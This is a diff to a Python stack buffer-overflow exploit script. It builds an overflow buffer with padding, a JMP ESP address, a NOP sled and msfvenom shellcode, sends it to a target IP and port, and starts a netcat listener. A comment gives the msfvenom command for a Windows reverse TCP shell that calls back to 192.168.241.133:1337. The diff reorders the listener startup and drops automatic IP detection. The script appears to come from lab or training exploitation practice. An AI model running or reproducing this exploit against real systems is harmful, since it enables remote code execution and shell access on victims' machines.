@@ -3,6 +3,7 @@
 import sys,socket,argparse,subprocess,re,os
 from pwn import p32
 
+
 #####################################################################SETUP######################################################################################
 
 
@@ -27,13 +28,6 @@ def buf():
     subprocess.check_output(pipecmd_pl,shell=True)
     from buf import buf
     return buf
-
-
-def get_ip():
-    pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
-    ip = subprocess.check_output(pipecmd_ip,shell=True)
-    ip_decoded = ip.decode('utf-8')
-    return ip_decoded
 
 
 def start_nc():
@@ -62,7 +56,6 @@ class fc:
 
 
 opt = get_args()
-ip = get_ip()
 overflow = opt.cmd + 'A' * opt.offset
 overflow = overflow.encode()
 padding   = b'\x90' * 32 
@@ -72,12 +65,15 @@ buf = buf()
 buffer = overflow + jmpesp + padding + buf
 
 
-print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}')
-
 ###################################################################RUN###########################################################################################
-
 #msfvenom -p windows/shell_reverse_tcp LHOST="192.168.241.133" LPORT=1337 EXITFUNC=thread -a x86 -b "\\x00" -f py > buf.py
+
+
 try:
+    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}')
+    print('\n')
+    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
+    start_nc()
     print(f'{fc.pink_violet}[+]{fc.end} {fc.end}{fc.b}Connecting to target...{fc.end}')
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((str(opt.ip), opt.port))
@@ -85,11 +81,7 @@ try:
     print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending payload: {str(len(buffer))} bytes.{fc.end}')
     s.send(buffer)
     print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Payload sent.{fc.end}')
-    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
-    
     s.close()
-    start_nc()
-
 except Exception as e:
         print(f'\tError: {fc.rw}{e}{fc.end}')
         sys.exit()
